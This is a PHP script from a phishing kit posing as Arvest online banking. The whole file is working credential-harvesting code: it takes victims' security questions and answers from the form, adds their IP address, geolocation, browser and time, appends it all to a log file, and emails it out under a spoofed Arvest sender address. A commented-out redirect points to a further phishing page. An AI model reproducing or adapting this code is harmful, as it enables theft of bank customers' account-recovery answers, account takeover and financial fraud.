<?php


function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

//Getting user ip & hostname
$date =	date("D M d, Y g:i a");
$user_agent  = $_SERVER['HTTP_USER_AGENT'];
$user_ip = getenv('REMOTE_ADDR');
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");

include("grabber.php");

$message = "--------------Arvest Online Banking Result-------------------\n";
$message .= "Security Question 1: ".$_POST['q1']."\n";
$message .= "Answer 1: ".$_POST['ans1']."\n";
$message .= "Security Question 2: ".$_POST['q2']."\n";
$message .= "Answer 2: ".$_POST['ans2']."\n";
$message .= "Security Question 3: ".$_POST['q3']."\n";
$message .= "Answer 3: ".$_POST['ans3']."\n";
$message .= "Security Question 4: ".$_POST['q4']."\n";
$message .= "Answer 4: ".$_POST['ans4']."\n";
$message .= "Security Question 5: ".$_POST['q5']."\n";
$message .= "Answer 5: ".$_POST['ans5']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Submitted By : ".$user_ip."\n";
$message .= "Country Name : {$geoplugin->countryName}"."\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date And Time : ".$adddate."\n";
$message .= "Browser Details : ".$user_agent."\n";
$message .= "--------xXx--------\n";
$message .= "IP Address: $ip \n";

$fp = fopen('arvest.txt', 'a');
fwrite($fp, $message);
fclose($fp);


$subject = "Arvest Online Banking ReZulT | $ip";
$headers = "From: Arvest Online Banking <customer@arvest.com>\n";
$headers .= "MIME-Version: 1.0\n";
//$headers .= "Content-Type: text/plain; charset=UTF-8\n";
//$headers .= "Content-Transfer-Encoding: 8bit\n";


if(mail($recipient, $subject, $message)){ 
   
//header("Location: identify.php?&".generateRandomString(200));
}else{
	
	echo "error sending email";
	
	}


//mail($recipient, $subj, $msg,"$headers");

?>


